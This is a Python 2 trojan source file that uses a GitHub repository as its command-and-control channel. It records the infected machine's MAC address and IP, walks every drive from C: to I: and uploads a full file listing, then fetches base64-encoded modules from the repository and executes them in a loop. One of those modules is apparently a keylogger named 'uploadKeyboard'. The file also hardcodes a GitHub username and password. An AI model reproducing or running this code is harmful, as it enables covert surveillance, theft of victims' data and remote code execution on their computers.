# -*- coding: utf-8 -*- #
import json
import base64
import sys
import time
import datetime
import imp
import random
import threading
import Queue
import os
import socket
import wmi
import stat

from github3 import *



def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    #print(repo)
    branch = repo.branch("master")

    return gh, repo, branch

def writeIpAppend(oricon,name,iip,d,t):
    if oricon == None : print "dont have such file\n" ;return;
    orimsg=base64.decodestring(str(oricon.content)) #origin file content
    if orimsg.find(name)==-1 :  # check if the pc is in origin file
        print "add new pc"
        oricon.update("append automatically from py",orimsg+str(name)+" "+iip+" "+d+" "+t+"\n")
    else :  # if have before
        print "update pc"
        newmsg = ""
        orilist = orimsg.split("\n")
        for ilist in orilist :
            if ilist == "" or ilist == " ": continue;
            if ilist.split()[0]==name :
                #print "origin msg : "+ilist
                newmsg += str(name)+" "+iip+" "+d+" "+t+"\n"    # new pc's time update
                continue;
            else :
                newmsg += ilist+"\n"
        oricon.update("update automatically from py",newmsg)


def LocalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 0))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

	
def getLocalTime():
    nowstamp = int(time.time())
    #turn into other format like:"%Y-%m-%d %H:%M:%S"
    timeArray = time.localtime(nowstamp)
    dateTimeFormat = time.strftime("%m/%d", timeArray)
    dayTimeFormat = time.strftime("%H:%M:%S", timeArray)
    return dateTimeFormat,dayTimeFormat

	
def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")


m=network()
print "getmac"

gh, rep, branch= connect_to_github()
con = rep.contents("ip/mumaip.txt")
nowip = LocalIp()
ddd,ttt = getLocalTime()
writeIpAppend(con,str(m),nowip,ddd,ttt)
print "writeIpAppend"


# search pc path and upload

def searchFileDir():
    all=""
    for p in ('c:\\','d:\\','e:\\','f:\\','g:\\','h:\\','i:\\'):
        try:
            FileNames=os.listdir(p)
            for root,dirs,files in os.walk(p):
                for filespath in files:
                    all+=os.path.join(root,filespath)
                    print(os.path.join(root,filespath))
        except:
            pass
    return all


def upFileDir(rep,m):
    if rep.contents("data/"+str(m)+"/doc.txt") == None :
#   init "mac"
        print "init"
        rep.create_file("data/"+str(m)+"/doc/doc.txt","upload dir",searchFileDir())
    con = rep.contents("data/"+str(m)+"/doc/doc.txt")
    sha = con.sha
    rep.update_file("data/"+str(m)+"/doc/doc.txt", "upload dir", searchFileDir(), sha)

upFileDir(rep,m)




trojan_id = str(m)

trojan_config = "%s.json" % trojan_id

task_queue = Queue.Queue()
configured = False



class GitImporter(object):
    def __init__(self):

        self.current_module_code = ""

    def find_module(self, fullname, path=None):

        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):

        module = imp.new_module(name)
        

        exec self.current_module_code in module.__dict__

        sys.modules[name] = module

        return module



def get_file_contents(filepath):
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s" % filepath

            blob = rep.blob(filename._json_data['sha'])
            print(blob.content)
            return blob.content

    return None


def get_trojan_config():
    global configured

    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec ("import %s" % task['module'])
       
        print(task)
    return config





def module_runner(module,ma):
    task_queue.put(1)
    print("==========================")
    #print(sys.modules)
    if module == "uploadKeyboard" or module == "uploadKeyboard" : result = sys.modules[module].run(ma)
    sys.modules[module].run()

    task_queue.get()


    return


# main trojan loop
sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():

        config = get_trojan_config()

        for task in config:

            t = threading.Thread(target=module_runner, args=(task['module'],m))
            t.start()
            time.sleep(random.randint(1, 10))

